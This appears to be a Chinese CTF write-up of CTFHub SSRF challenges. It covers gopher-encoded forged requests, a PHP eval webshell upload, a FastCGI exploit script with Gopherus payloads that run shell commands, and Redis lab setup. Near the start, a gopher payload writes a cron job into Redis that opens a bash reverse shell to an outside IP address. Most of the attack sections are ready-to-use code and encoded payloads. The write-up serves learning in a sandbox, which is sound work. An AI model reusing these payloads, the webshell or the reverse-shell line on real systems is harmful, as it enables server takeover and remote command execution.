# CTFHUB - SSRF

**目录**

[TOC]



 [SSRF漏洞Bypass技巧 - 知乎](https://zhuanlan.zhihu.com/p/73736127) 

## SSRF漏洞

照常 我们先了解一下什么是SSRF漏洞

给大家一个图



<img src="https://i-blog.csdnimg.cn/blog_migrate/f0f2f5096cd578e74206814fdbffaa06.png" alt="" style="max-height:551px; box-sizing:content-box;" />


其实就是

web服务器通过 其他的url访问资源

这些资源不属于web服务器的

例如

http://127.0.0.1/?url=https://baidu.com

这样如果访问了 百度 那么这个就很可能存在着 ssrf

### 攻击对象

一般都是内网服务

```undefined
SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
```

### 攻击形式

我们可以通过 ssrf读取文件等

```cobol
http://127.0.0.1/?url=file:///c:/windows/win.ini
```

### 产生漏洞的函数

因为设计者对函数的使用不当 所以造成的ssrf

我们可以来看看

```scss
file_get_contents()  fsockopen() curl_exec() fopen() readfile()
```

#### file_get_contents()

<span style="color:#fe2c24;">file_get_contents()</span>将读取url内容保存为一个文件 并且通过读取文件内容作为字符串输出

```php
<?php
highlight_file(__FILE__);
$url = $_GET['url'];;
echo file_get_contents($url); 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ee921811b21a54085129704fab4d5120.png" alt="" style="max-height:210px; box-sizing:content-box;" />


这里我们发现 我们访问了 win.ini的内容

所以 file_get_contents 可以通过伪协议读取内容

#### fsockopen()

fsockopen是用来打开一个网络连接 用来实现对url的访问

```php
<?php
 
use FTP\Connection;
 
$host=$_GET['url'];
$fp= fsockopen($host,80,$errno,$errstr,30);
if(!$fp){
    echo "$errstr ($errno)<br />\n";
}else{
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";  //类似设置请求头
    fwrite($fp,$out);
    while(!feof($fp)){     //打开链接  输出请求头
        echo fgets($fp,128);
    }
    fclose($fp);
}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/235730db63c6814a1f690e267d8cbbc5.png" alt="" style="max-height:677px; box-sizing:content-box;" />


类似于 302重定向

#### curl_exec()

其实就类似于爬虫 去访问url 然后返回 result

```php
<?php
header("content-type:text/html;charset=utf-8"); 
highlight_file(__FILE__);
if(isset($_GET["url"])){
    $link=$_GET["url"];
    $curlobj=    curl_init();  //创建新的curl资源
    curl_setopt($curlobj,CURLOPT_POST,0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj,CURLOPT_RETURNTRANSFER,1);  //设置url的链接选项等
    $resurl=curl_exec($curlobj);
    curl_close($curlobj);
    echo $resurl;
}
```

我们将url 设置为 www.baidu.com 即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/9bfd9f3dc48105cb775c0d8b967ed6e0.png" alt="" style="max-height:702px; box-sizing:content-box;" />


但是 curl_exec 的危害不止这么一点 我们可以通过其他方式提高 curl_exec的危害

##### 提高危害

```dart
file dict gopher
 
curl -vvv 'dict://127.0.0.1:6379/info' 
curl -vvv 'file:///etc/passwd' 
# * 注意: 链接使用单引号，避免$变量问题 
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

### 利用的伪协议

#### file

最简单就是file伪协议 读取文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/ee921811b21a54085129704fab4d5120.png" alt="" style="max-height:210px; box-sizing:content-box;" />


ssrf 我们可以通过file协议来读取文件

#### dict

泄露安装软件版本信息，查看端口，操作内网redis服务等

#### gopher

gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell



## 内网访问

首先提示了



<img src="https://i-blog.csdnimg.cn/blog_migrate/0affd7fd6bd81d535b104d907450e257.png" alt="" style="max-height:277px; box-sizing:content-box;" />


我们既然是ssrf  那么我们就需要通过web服务器访问

那么我们构造 http://127.0.0.1/flag.php

即可获得flag

## 伪协议读取文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/6c160a2c93e1f5b2d1767cd2ba28f949.png" alt="" style="max-height:192px; box-sizing:content-box;" />


```cobol
/?url=file:///var/www/html/flag.php
```

## 端口扫描

因为ssrf可以对内网进行端口探测 就是可以对127.0.0.1 进行探测

所以我们直接开始扫





<img src="https://i-blog.csdnimg.cn/blog_migrate/24a1125af37197cceddaadf244fb7394.png" alt="" style="max-height:564px; box-sizing:content-box;" />


## POST请求

这里提示我们了

我们依然 通过file 伪协议去看看 flag.php

```cobol
GET /?url=file:///var/www/html/flag.php HTTP/1.1
```

```cobol
<?php
 
error_reporting(0);
 
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}
 
$flag=getenv("CTFHUB");
$key = md5($flag);
 
if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>
 
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=<?php echo $key;?>-->
</form>
```

发现了 我们需要通过 127.0.0.1 访问 然后post的内容为 key的内容 key是什么呢

因为他需要从本地访问 并且漏洞为ssrf  我们可以构造本地访问

所以我们去看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/130db48a3ad448096b049a938831ac5f.png" alt="" style="max-height:335px; box-sizing:content-box;" />


发现存储的是key的变量

每个人不一样

```cobol
key=d4c37651847648ede83ed438dcb77f1d
```

这里的考点是 需要伪造一个从本地发送的POST包 并且包含key 然后可以获取flag

我们先写一个post格式

```cobol
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
 
key=d4c37651847648ede83ed438dcb77f1d
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2f1d55b4eab8f9ecb335a84aea90d9a8.png" alt="" style="max-height:172px; box-sizing:content-box;" />


这里的length 需要确定是多少

这里我们需要使用万能协议 gopher协议

用法

```ruby
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

这里的tcp数据流我们需url编码

```cobol
1、问号（？）需要转码为URL编码，也就是%3f
2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
```

所以我们需要将里面的 %0a百年未 %0d%0a 并且末尾也要加上

我们先来第一次url编码

```cobol
POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=d4c37651847648ede83ed438dcb77f1d
```

修改 %0a为 %0d%0a 末尾也加上 %0d%0a

然后再进行url编码

```cobol
POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=d4c37651847648ede83ed438dcb77f1d%250d%250a
```

然后构造 gopher协议格式

```cobol
gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=d4c37651847648ede83ed438dcb77f1d%250d%250a
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/fe7b0617e15b7619e7dc6061229021cb.png" alt="" style="max-height:368px; box-sizing:content-box;" />


### 总结

```cobol
gopher 是个万能协议 用来查看信息
 
我们利用的时候 需要按GET POST   格式写请求包
 
然后通过 一次url编码
 
修改%0a  为  %0d%0a 
 
在末尾也要写上 %0d%0a 
 
然后再进行一次url编码
 
然后按照 gopher格式
 
gopher://ip:port/_数据流
 
写入即可
```

## 上传文件

这里就是在flag的地方改变了判断语句变为了文件上传的类型

我们抓包看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/2290f83293d821a5943a78507d1c0dcf.png" alt="" style="max-height:585px; box-sizing:content-box;" />


这里我们直接去访问这个文件看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/7f24b5c4857dc092c44ce0801e7c51b8.png" alt="" style="max-height:206px; box-sizing:content-box;" />


发现没有提交框 我们自己加一个

```cobol
<input type="submit" name="提交">
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e3ecceb7eb08914dfbb92a1d27d4b4b9.png" alt="" style="max-height:177px; box-sizing:content-box;" />


上传一个小马

抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/63d7b45fc74882965aac1fc215558838.png" alt="" style="max-height:541px; box-sizing:content-box;" />


修改这里为 127.0.0.1:80

```cobol
import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17915680277862189741700162877
Content-Length: 407
Origin: http://challenge-19841609aa2cc7a4.sandbox.ctfhub.com:10800
Connection: close
Referer: http://challenge-19841609aa2cc7a4.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Upgrade-Insecure-Requests: 1

-----------------------------17915680277862189741700162877
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: image/jpeg

GIF89a
<script language="php">
    @eval($_POST['cmd']);
</script>
-----------------------------17915680277862189741700162877
Content-Disposition: form-data; name="鎻愪氦"

鎻愪氦鏌ヨ
-----------------------------17915680277862189741700162877--
"""
#注意后面一定要有回车，回车结尾表示http请求结束。Content-Length是key=e01fdff5c126356cb64cf2436f8c7704的长度
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
 
```

给出脚本 自动 替换和加上 %0d%0a

直接把bp抓的修改为127.0.0.1后的写入 然后跑即可

```cobol
gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A109.0%2529%2520Gecko/20100101%2520Firefox/118.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------23265606433349610851965678358%250D%250AContent-Length%253A%2520407%250D%250AOrigin%253A%2520http%253A//challenge-19841609aa2cc7a4.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-19841609aa2cc7a4.sandbox.ctfhub.com%253A10800/%253Furl%253Dfile%253A///var/www/html/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------23265606433349610851965678358%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.jpg%2522%250D%250AContent-Type%253A%2520image/jpeg%250D%250A%250D%250AGIF89a%250D%250A%253Cscript%2520language%253D%2522php%2522%253E%250D%250A%2520%2520%2520%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%250D%250A%253C/script%253E%250D%250A-----------------------------23265606433349610851965678358%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%25E9%258F%258C%25E3%2583%25A8%25EE%2587%2597%250D%250A-----------------------------23265606433349610851965678358--%250D%250A
```

然后抓包

<img src="https://i-blog.csdnimg.cn/blog_migrate/3f56bc4c892453be143b2fc2b2d951b6.png" alt="" style="max-height:617px; box-sizing:content-box;" />


访问成功

### 总结

我们发现 ssrf 我们可以传递 需要的数据包 需要是值 我们就可以传递值 需要是文件

我们也可以传递文件

## FastCGI协议

 [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写-CSDN博客](https://blog.csdn.net/mysteryflower/article/details/94386461) 

 [利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/263342.html) 

这个协议 我们在bypass disable_function中也学习过

其实就是 需要调用php文件的时候 web服务器通过 FasCGI协议传递给 php解释器

然后通过解释器返回值 再返回给用户

 [https://www.cnblogs.com/itbsl/p/9828776.html](https://www.cnblogs.com/itbsl/p/9828776.html) 

```objectivec
CGI 将读取到的http内容传入 环境变量 作为 标准输入 输入到 PHP 的 CGI程序
 
然后PHP的CGI程序 将返回值作为标准输出 返回给web服务器的 CGI并且转变为 http格式
```

### CGI和FastCGI的区别

```swift
这里我们其实看名字就可以发现了 
 
CGI 和 FastCGI 就多了 Fast
 
首先我们需要先了解 CGI的缺点
 
1.在处理每一次的请求的时候 都需要 fork CGI程序 摧毁 CGI程序 
 
这里就会造成很大的浪费 
 
2.一系列的 I/O 就会开销 降低了网络的吞吐量 降低利用效率
```

```swift
其实 CGI 和 FastCGI 最重要的差别 
 
只是差别在了 通信方式 上
 
FastCGI的运行过程：
 
1.FastCGI 会创建一个 master  和多个 CGI 进程 然后等待web服务器的链接
 
2.web服务器接受到请求后 通过 套字节的方式(UNIX或者 TCP Socker)进行通信
讲环境变量和请求数据 写入 标准输入 转发到 CGI进程
 
3.CGI 将处理完的数据等 作为标准输出 返回到 web服务器
 
4.CGI 进程 将继续等待下一个http的到来
```

这里我们就可以发现 其实最大的区别是在 是否销毁 CGI程序上

这里还需要谈到为什么一定要 FastCGI

```swift
CGI框架下 CGI程序的生命周期 完全取决于 HTTP 请求
 
FastCGI框架下 CGI程序就例如 常驻嘉宾 是一直等待下次的到来
```

### FastCGI协议

```vbnet
既然是协议 就有标准的格式 我们现在来看看
 
下面是主要的消息头
 
Version:用于标注 FastCGI程序的版本
Type: 用于标注 FastCGI程序的类型 （用来决定程序处理的方式）
RequestID： 表示出当前所属的FastCGI程序ID
Content Length： 请求包的字节长度
 
我们现在看看 上面的Type中 消息类型的定义
 
BEGIN_REQUEST:从web服务器到web应用，表示一个新的请求
 
ABORT_REQUEST:从web服务器到web应用，这个表示一个请求的终止，例如我点击刷新界面 迟迟没有响应
 
我就点击×号取消 
 
END_REQUEST:从web应用发给web服务器，表示该请求完毕，返回数据包里包含返回代码，用来决定是否请求成功
 
PARAMS:[流数据包]，从web服务器到web应用，这个请求可以允许多个请求包，结束标志位服务器发送一个
 
长度位0的数据包 并且数据类型一直（FastCGI协议的数据类型） 就例如$_server 我们获取到的系统环境
 
STDIN:[流数据包] web应用从标准输入中 读取出 POST数据
 
STDOUT:[流数据报] web应用写入标准输出中 包含返回给用户的数据
```

在上面 我们可以学习到 FastCGI的格式 和 其中Type的类型

### FastCGI和web服务器的交互过程

```cobol
web服务器接受到 用户请求 ，但是其实最终是否接受请求都是 web应用实现
 
 
1.web服务器接受到请求 通过套字节的方式 链接 FastCGI程序
 
2.FastCGI程序接收到请求 选择[接受]或者[拒绝] 如果接受 就从标准输入中读取
 
3.如果FastCGI在一定时间内没有接收到成功链接 那么就请求失败
 
4.否则 web服务器发送包含唯一的 REQUESTID 的 BEGIN_REQUEST消息类型  到 FastCGI程序
后续的所有请求包都需要按照唯一的 REQUESTID 来发送
 
5.然后web服务器开始发送 任意数量的 PARAMS 消息类型 到 FastCGI 
 
6.发送完毕 就发送一个长度为 0 的 PARAMS 消息类型到 FastCGI 来代表请求包结束 然后关闭这个流
 
7.如果用户通过 POST方式 传递了数据  那么服务器会将其写入标准输入 STDIN 发送完毕就会发送
一个空白的 STDIN 给 FastCGI 来关闭这个流
 
8.在上面发生的同时 FastCGI 接受到 BEGIN_REQUEST 可以通过 ENDREQQUEST 来拒绝处理
 
9.如果要处理这个请求 FastCGI 会接受所有的PARAMS和标准输入 然后将结果写入标准输出 STDOUT 中
 
10.处理完毕就会发送一个 空白 的标准输出 来关闭这个流 同时发送 END_REQUEST消息给web服务器
```

这里我们需要知道 web服务器有可能一时间会受到 十多个 BEGINREQUEST

所以为什么我们需要 REQUESTID 来表示

### PHP-FPM

```undefined
PHP-FPM 是 FastCGI的实现 提供了 进程管理服务
 
包含着 master 和 worker 两个进程
 
master只有一个 用来监听
 
worker存在多个 内置PHP解释器 用来真正处理php的地方
```

我们这里已经了解完了 FastCGI 协议的内容

我们返回到 这个协议和SSRF 的关系

### 攻击原理

由于 PHP-FPM 一般监听 9000端口

只会接受本地的请求 这里我们就可以通过 SSRF 来利用 因为 SSRF 我们就可以伪造 本地访问

去传递包 给FastCGI 服务器

```cobol
一般 FastCGI服务器只接受 127.0.0.1的请求
 
ssrf 可以伪造请求 欺骗 FastCGI服务器 
 
那么我们就可以直接构造 请求包
 
这里就存在一个FPM请求中的参数
 
SCRIPT_FILENAME 
 
这个参数可以指向文件 我们只需要构造这个文件 就可以执行任意的php文件了
 
```

#### 实现RCE

```cobol
这里就遇到了php的设置
 
auto_prepend_file 和 auto_append_file
 
这两个是 在执行php 前/后 自动包含文件
 
如果我们设置 auto_prepend_file 为 php://input
 
那么是不是 我们执行任意文件 都会包含一次 我们POST的内容
```

```cobol
下面是如何设置 这两个值
 
这里就又回到 PHP-FPM中了
 
PHP-VALUE 和 PHP-ADMIN-VALUE
 
我们只需要将
 
PHP-VALUE 设置为 auto-prepend-file=php://input
 
PHP-ADMIN-VALUE 设置为 all_url_include=On
 
这样就可以实现命令执行
```

### 做题

#### 1.exp

这里首先给出exp

```cobol
import socket
import random
import argparse
import sys
from io import BytesIO
# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
PY2 = True if sys.version_info.major == 2 else False
def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])
def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)
def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')
def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s
class FastCGIClient:
    """A Fast-CGI Client for Python"""
    # private
    __FCGI_VERSION = 1
    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3
    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11
    __FCGI_HEADER_SIZE = 8
    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3
    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()
    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True
    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf
    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value
    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header
    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record
    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return
        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)
        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
```

我们首先通过nc监听端口

```less
nc -lvvp [端口] > [文件名]
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/84df0dda9706d9298d92babc69992325.png" alt="" style="max-height:142px; box-sizing:content-box;" />


然后通过上面的exp执行命令

```css
python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]
```

这里我们能知道的是 /var/www/html/index.php

所以我们要执行的php文件是 index.php

所以这里的命令就是

```cobol
py2 .\exp.py -c "<?php system('ls /');?>" -p 9000 127.0.0.1 /var/www/html/index.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/974fd5d1a02ba63f37625bf50c504221.png" alt="" style="max-height:399px; box-sizing:content-box;" />


发现获取到了 攻击流量

我们通过 url编码即可

```cobol
# -*- coding: UTF-8 -*-
from urllib.parse import quote, unquote, urlencode
file= open('C:\\Users\\Administrator\\Desktop\\1.txt','rb')
payload= file.read()
payload= quote(payload).replace("%0A","%0A%0D")
print("gopher://127.0.0.1:9000/_"+quote(payload))
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4bc843248754d1bfd0670d942129f589.png" alt="" style="max-height:108px; box-sizing:content-box;" />


然后实现攻击

但是我失败了 确实不知道为什么

我选择第二个方式

 [https://blog.csdn.net/mysteryflower/article/details/94386461](https://blog.csdn.net/mysteryflower/article/details/94386461) 

#### 2.gopherus

打开kali 使用这个工具 直接输出payload

```cobol
git clone https://github.com/tarunkant/Gopherus.git
 
cd Gopherus
 
python2 gopherus.py --exploit fastcgi
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2fe04a6db6b51cd88af9182caea42c4e.png" alt="" style="max-height:194px; box-sizing:content-box;" />


然后我们需要再一次进行url编码

然后实现利用

ls /的payload

```cobol
gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520/%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

cat /f*

```cobol
gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520/f%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2cdec376c7ca74b879623ff7d0e9b9a9.png" alt="" style="max-height:203px; box-sizing:content-box;" />


## Redis协议

 [SSRF漏洞之Redis利用篇【三】 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/303275.html) 

跟着这个学习一下 Redis协议的内容

首先通过docker安装 存在未授权漏洞的 Redis 容器

### 环境搭建

```cobol
# 搜索镜像
docker search ju5ton1y
# 拉取镜像
docker pull ju5ton1y/redis
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/510a9ab901d7d84e68df088c355bad87.png" alt="" style="max-height:440px; box-sizing:content-box;" />


```cobol
# 运行Redis
docker run -p 6788:6379 --name redis_test -d ju5ton1y/redis
 
 
其中 -p 6788:6379 代表  宿主机:容器的 端口映射
 
--name redis_test 命名容器 
 
-d ju5ton1y/redis 后台的容器id
```

我们进入容器 安装 抓包工具

```cobol
docker exec -it redis_test /bin/bash
 
 
设置 权限
 
 
 
sed -i 's/requirepass 123123/#requirepass 123123/g' /etc/redis.conf
 
设置 redis.conf 设置为 无密码未授权
 
 
# 重启容器使配置生效
docker restart redis_test
 
 
安装 tcpdump抓包工具
apt-get update
apt-get install tcpdump 
 
 
# 监听eth0网卡的6379端口，将报文保存为nopass.pcap
tcpdump -i eth0 port 6379 -w nopass.pcap
```

这里我写详细一点

下载下面的内容

 [Linux/Windows Redis的下载与安装_redis-cli下载-CSDN博客](https://blog.csdn.net/qq_45056135/article/details/128173321) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/3b5910784d7e54b0c209b59d90514056.png" alt="" style="max-height:395px; box-sizing:content-box;" />


通过 终端

访问 ip:端口

```cobol
./redis-cli.exe -h 本机ip -p 6788
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/41c6539c2021599b78dd28b4310f9255.png" alt="" style="max-height:187px; box-sizing:content-box;" />
然后回到 容器机器中

```bash
exit 退出 容器
 
docker cp redis_test:/nopass.pcap 你的目录
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/279c236e909b12620b9c1d6932ea8bb8.png" alt="" style="max-height:79px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f92f252a2d1bdf1777c6027b6a7db8ad.png" alt="" style="max-height:368px; box-sizing:content-box;" />
然后我们就获取了 流量

然后我们通过 wireshark打开

分析-追踪流-TCP



